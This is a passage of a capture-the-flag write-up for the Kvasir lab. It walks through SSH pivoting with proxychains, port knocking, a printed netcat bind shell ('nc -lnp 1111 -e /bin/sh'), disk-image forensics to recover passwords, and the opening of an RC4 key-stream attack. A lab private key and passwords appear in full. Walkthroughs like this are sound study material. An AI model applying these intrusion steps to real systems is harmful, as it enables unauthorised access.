</span><span class='line'>bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
</span><span class='line'>JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
</span><span class='line'>cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
</span><span class='line'>gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
</span><span class='line'>+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
</span><span class='line'>agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
</span><span class='line'>pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
</span><span class='line'>ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
</span><span class='line'>WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
</span><span class='line'>7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
</span><span class='line'>W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
</span><span class='line'>bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
</span><span class='line'>mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw<span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>Considering that <strong>192.168.3.50</strong> was named as <code>terra</code> in that <code>/etc/hosts</code> file, I attempted authentication using this key on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>Linux dev2 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
</span><span class='line'>terra@dev2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, I also opened another socks proxy locally on port <code>tcp/8001</code> in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to <code>dev2</code> in red:</p>

<p><img src="https://i.imgur.com/Pt8SFVJ.png"></p>

<h2>letting myself in via the back door</h2>

<p>Enumerating <code>dev2</code> did not reveal much interesting information. In fact, the most important clue found was in a mail for <code>terra</code> from Locke:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>cat /var/spool/mail/terra
</span><span class='line'>Return-path: &lt;locke@192.168.4.100&gt;
</span><span class='line'>Received: from locke by 192.168.4.100 with <span class="nb">local</span> <span class="o">(</span>Exim 4.80<span class="o">)</span>
</span><span class='line'>~       <span class="o">(</span>envelope-from &lt;locke@adm&gt;<span class="o">)</span>
</span><span class='line'>~       id 1XHczw-0000V2-8y
</span><span class='line'>~       <span class="k">for </span>terra@192.168.3.50<span class="p">;</span> Wed, 13 Aug 2014 19:10:08 +0100
</span><span class='line'>
</span><span class='line'>Date: Wed, 13 Aug 2014 19:10:08 +0100
</span><span class='line'>To: terra@192.168.3.50
</span><span class='line'>Subject: Port Knock
</span><span class='line'>User-Agent: Heirloom mailx 12.5 6/20/10
</span><span class='line'>MIME-Version: 1.0
</span><span class='line'>Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
</span><span class='line'>Content-Transfer-Encoding: 7bit
</span><span class='line'>Message-Id: &lt;E1XHczw-0000V2-8y@adm&gt;
</span><span class='line'>From: locke@192.168.4.100
</span><span class='line'>~
</span><span class='line'>Hi Terra,
</span><span class='line'>
</span><span class='line'>I<span class="err">&#39;</span>ve been playing with a port knocking daemon on my PC - see <span class="k">if </span>you can use that to get a shell.
</span><span class='line'>Let me know how it goes.
</span><span class='line'>
</span><span class='line'>Regards,
</span><span class='line'>Locke
</span></code></pre></td></tr></table></div></figure>


<p>Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on <strong>192.168.4.100</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># /etc/proxychains.conf has line</span>
</span><span class='line'><span class="c"># socks5    127.0.0.1 8001</span>
</span><span class='line'>
</span><span class='line'><span class="c"># scans will appear to be coming from 192.168.4.50 for</span>
</span><span class='line'><span class="c"># 192.168.4.100</span>
</span><span class='line'>root@kali:~# proxychains nmap -sT 192.168.4.100
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 17:39 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.4.100
</span><span class='line'>Host is up <span class="o">(</span>0.0018s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 999 closed ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 1.75 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Only <code>tcp/22</code>. :s</p>

<p>I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a> (<code>knockd</code>), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file <a href="https://github.com/jvinet/knock/blob/master/knockd.conf">here</a>, which revealed the default sequence of: <code>7000,8000,9000</code>. So, I tested this by attempting to connect with <code>nc</code> to these ports on <strong>192.168.4.100</strong>, and following up with a nmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>nc -v 192.168.4.100 7000 -w 1<span class="p">;</span> nc -v 192.168.4.100 8000 -w 1<span class="p">;</span> nc -v 192.168.4.100 9000 -w 1
</span><span class='line'>192.168.4.100: inverse host lookup failed: Host name lookup failure
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.4.100<span class="o">]</span> 7000 <span class="o">(</span>afs3-fileserver<span class="o">)</span> : Connection refused
</span><span class='line'>192.168.4.100: inverse host lookup failed: Host name lookup failure
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.4.100<span class="o">]</span> 8000 <span class="o">(</span>?<span class="o">)</span> : Connection refused
</span><span class='line'>192.168.4.100: inverse host lookup failed: Host name lookup failure
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.4.100<span class="o">]</span> 9000 <span class="o">(</span>?<span class="o">)</span> : Connection refused
</span><span class='line'>terra@dev2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The nmap after the knock:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nmap -sT 192.168.4.100
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 17:45 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.4.100
</span><span class='line'>Host is up <span class="o">(</span>0.0015s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 998 closed ports
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>22/tcp   open  ssh
</span><span class='line'>1111/tcp open  lmsocialserver
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 1.71 seconds
</span></code></pre></td></tr></table></div></figure>


<p>A new port! <code>tcp/1111</code> :) Lets check it out.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nc 192.168.4.100 1111
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># a new connection has no output. Only after typing</span>
</span><span class='line'><span class="c"># &#39;crap&#39; do you realise you have a sh session open</span>
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Shell access as <code>locke</code> on <strong>192.168.4.100</strong>. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&hellip; The new connection denoted in red again:</p>

<p><img src="https://i.imgur.com/u2klDxc.png"></p>

<h2>busting kefka</h2>

<p>The shell on <code>adm</code> as <code>locke</code> was nothing more than a <code>/bin/sh</code> instance executed over <code>netcat</code>. This can be seen in the <code>littleShell.sh</code> file in <code>/home/locke</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat littleShell.sh
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>
</span><span class='line'>/bin/nc -lnp 1111 -e <span class="s1">&#39;/bin/sh&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Other interesting files were all in <code>locke</code>&rsquo;s home directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/locke
</span><span class='line'>ls -lh
</span><span class='line'>total 332K
</span><span class='line'>-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
</span><span class='line'>-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
</span><span class='line'>-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
</span></code></pre></td></tr></table></div></figure>


<p>The <code>note.txt</code> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat note.txt
</span><span class='line'>Looks like Kefka may have been abusing our removable media policy.  I<span class="err">&#39;</span>ve extracted this image to have a look.
</span></code></pre></td></tr></table></div></figure>


<p>Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the <code>diskimage.tar.gz</code> file to progress. The first thing I had to do was get a local copy of <code>diskimage.tar.gz</code>. Out comes <code>netcat</code> again :) I hosted the file on <code>tcp/4444</code> on <strong>192.168.4.100</strong> with <code>nc -lvp 4444 &lt; diskimage.tar.gz | xxd -p</code>. I then read the file on my attacking machine with <code>timeout 5 proxychains nc 192.168.4.100 4444 &gt; diskimage.tar.gz</code> (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).</p>

<p>I had to carve out the string <em>ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</em> out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple <code>dd</code> on the top line and it was gone :)</p>

<p>I then extracted the archive and ran the resultant archive through <code>file</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tar xvf diskimage.tar.gz
</span><span class='line'>diskimage
</span><span class='line'>
</span><span class='line'>root@kali:~# file -k diskimage
</span><span class='line'>diskimage: x86 boot sector, code offset 0x3c, OEM-ID <span class="s2">&quot;MSDOS5.0&quot;</span>, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 <span class="o">(</span>volumes &gt; 32 MB<span class="o">)</span> , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT <span class="o">(</span>16 bit<span class="o">)</span> DOS executable <span class="o">(</span>COM<span class="o">)</span>, boot code
</span></code></pre></td></tr></table></div></figure>


<p>Ok, so this really looks like a disk image. I decided to mount it and have a look inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mount diskimage /mnt/
</span><span class='line'>
</span><span class='line'>root@kali:~# ls -lah /mnt/
</span><span class='line'>total 21K
</span><span class='line'>drwxr-xr-x  2 root root  16K Jan  1  1970 .
</span><span class='line'>drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
</span><span class='line'>-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar
</span><span class='line'>
</span><span class='line'><span class="c"># oh! a .rar? Lets extract...</span>
</span><span class='line'>root@kali:~# unrar x /mnt/Secret.rar
</span><span class='line'>
</span><span class='line'>UNRAR 4.10 freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2012 Alexander Roshal
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Extracting from /mnt/Secret.rar
</span><span class='line'>
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> <span class="k">for </span>MyPassword.txt:
</span><span class='line'>
</span><span class='line'>No files to extract
</span></code></pre></td></tr></table></div></figure>


<p>A <code>.rar</code> archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&hellip;</p>

<p>Some googling around got me a hit on a tool called <code>autopsy</code>, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:</p>

<p><img src="https://i.imgur.com/SBIbnMU.png"></p>

<p><code>C:/Funky.wav</code>. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the <em>Export</em> link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.</p>

<p>It sounded like this:</p>

<p><img src="https://i.imgur.com/IbdKBKR.gif"></p>

<p>Yeah, I don&rsquo;t get it either. I was stumped for a few minutes again, until I remembered <a href="http://vulnhub.com/entry/xerxes-201,97/">Xerxes2</a>, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by <a href="http://www.sonicvisualiser.org/index.html">Sonic Visualizer</a>. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:</p>

<p><img src="https://i.imgur.com/7bxW0Xc.png"></p>

<p><em>OrcWQi5VhfCo</em>. Was this the password for the <code>.rar</code> archive?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# unrar x /mnt/Secret.rar
</span><span class='line'>
</span><span class='line'>UNRAR 4.10 freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2012 Alexander Roshal
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Extracting from /mnt/Secret.rar
</span><span class='line'>
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> <span class="k">for </span>MyPassword.txt:
</span><span class='line'>
</span><span class='line'>Extracting  MyPassword.txt                                            OK
</span><span class='line'>All OK
</span><span class='line'>root@kali:~# cat MyPassword.txt
</span><span class='line'>5224XbG5ki2C
</span></code></pre></td></tr></table></div></figure>


<p>Yep! However, another random string. Remembering the note about this being a disk image from <code>kefka</code>, I attempted to SSH into <strong>192.168.4.100</strong> as <code>kefka</code> with this password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>kefka@192.168.4.100<span class="err">&#39;</span>s password: <span class="c"># entered 5224XbG5ki2C</span>
</span><span class='line'>Linux adm 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
</span><span class='line'>kefka@adm:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>A final <code>tcp/8002</code> proxy was opened on my attacking machine.</p>

<h2>taking the last ride to the flag</h2>

<p>Enumeration as kefka revealed that this user is allowed to run <code>/opt/wep2.py</code> as root. This is almost screaming at me as the privilege escalation path!</p>

<p>I ran the script with sudo, just to be presented with&hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py
</span><span class='line'>^CTraceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 93, in &lt;module&gt;
</span><span class='line'>    sock, <span class="nv">addr</span> <span class="o">=</span> s.accept<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/socket.py&quot;</span>, line 202, in accept
</span><span class='line'>    sock, <span class="nv">addr</span> <span class="o">=</span> self._sock.accept<span class="o">()</span>
</span><span class='line'>KeyboardInterrupt
</span><span class='line'>kefka@adm:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I re-run the script backgrounding it with <code>&amp;</code>, and inspect the output of <code>netstat -pant</code> to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new <code>tcp/8002</code> proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># /etc/proxychains.conf has line</span>
</span><span class='line'><span class="c"># socks5    127.0.0.1 8002</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connections will appear to be coming from localhost</span>
</span><span class='line'>root@kali:~# proxychains nc -v 127.0.0.1 1234
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>127.0.0.1: inverse host lookup failed:
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1<span class="o">]</span> 1234 <span class="o">(</span>?<span class="o">)</span> open : Operation now in <span class="nv">progress</span>
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>Can you retrieve my secret..?
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>V
</span><span class='line'>5a5062:36507a63b56865f7fd201860
</span><span class='line'>^C
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>We are presented with yet another <em>game</em>, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the <code>netcat</code> connection killed, causing me to have to re-run <code>sudo /opt/wep2.py</code> on the kefka session.</p>

<p>By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were <code>salt:cyphertext</code>, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with <em>A</em>, and studied the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>E A
</span><span class='line'>348bbc:8d
</span><span class='line'>E A
</span><span class='line'>f2fb0c:6e
</span><span class='line'>E A
</span><span class='line'>64d7fb:2d
</span></code></pre></td></tr></table></div></figure>


<p>Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.</p>

<p>Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename <code>wep2.py</code> should be taken as a hint!</p>

<p><em>This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)</em></p>

<h3>understanding what WEP actually is</h3>

<p>With the limited interaction I have had with the last game, and the hint <code>wep2</code>, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.</p>

<p>Some resources that really helped me get to grips with what we are facing here was:
 <a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf">http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</a>
 <a href="http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt">http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt</a>
 <a href="http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt">http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt</a>
 <a href="http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf">http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf</a></p>

<p>Of the above list, I highly recommend you check out the <code>.ppt</code>&rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.</p>

<p>The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let <em>C</em> be the cipher text and <em>P</em> be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:</p>

<p><strong>C = P ^ RC4(iv, k)</strong></p>

<p>With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about <a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">Stream Cipher Attacks</a> and <a href="http://en.wikipedia.org/wiki/Related-key_attack">Related Key Attacks</a>. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.</p>

<p>My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&rsquo;s, I can XOR the 2 cipher texts with each other to determine the key stream for that IV, and then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the <code>2</code> in <code>wep2</code> was another troll :)</p>

<h3>attacking the encryption game</h3>

